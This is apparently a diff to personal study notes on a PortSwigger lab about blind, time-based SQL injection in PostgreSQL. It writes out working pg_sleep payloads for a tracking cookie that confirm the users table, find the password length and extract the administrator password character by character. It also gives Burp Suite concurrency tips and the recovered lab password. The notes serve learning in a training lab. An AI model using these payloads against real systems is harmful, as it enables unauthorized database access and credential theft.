@@ -1,5 +1,7 @@
 Lab #14 - Blind SQLi with time delays and informational retrieval
 
+https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+
 Vulnerable parameter - tracking cookie
 
 End Goals:
@@ -14,19 +16,28 @@ Analysis:
 
 2) Confirm that the users table exists in the database
 
-' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--
+' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)-- /* if it does sleep 10 sec or else dont sleep
+
+' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
 
 ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
 
 3) Enumerate the password length
 
-' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
+' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+my test misleading here aneways its taking delay why?
+' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(-1) else pg_sleep(10) end from users)--
+
+' || (select case when (username='administrator' and LENGTH(password)>$1-25$) then pg_sleep(-1) else pg_sleep(15) end from users)--
+also make sure the resource pool to execute single thread at a time in burpsuite settings default:10
+
 -> length of password is 20 characters
 
 4) Enumerate the administrator password
 
 ' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
-
-13ipnob7l2dkjp3drryy
+ i use the python script for brute. make sure to set resource pool concurrent requests to 1 in burpsuite settings to get perfect answer.
+lveq76b7e3voggxvxxv9
 
 
